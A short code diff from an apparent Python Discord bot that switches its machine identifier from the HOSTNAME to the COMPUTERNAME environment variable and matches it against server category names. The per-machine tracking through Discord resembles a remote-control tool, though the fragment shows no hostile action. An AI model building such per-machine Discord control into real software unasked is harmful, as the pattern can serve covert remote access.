@@ -44,7 +44,7 @@ async def on_ready():
     global hwid
     
     guild = client.get_guild(serverID)
-    hwid = os.getenv("HOSTNAME")
+    hwid = os.getenv("COMPUTERNAME")
    
     for category_name in guild.categories:
         if hwid == str(category_name):
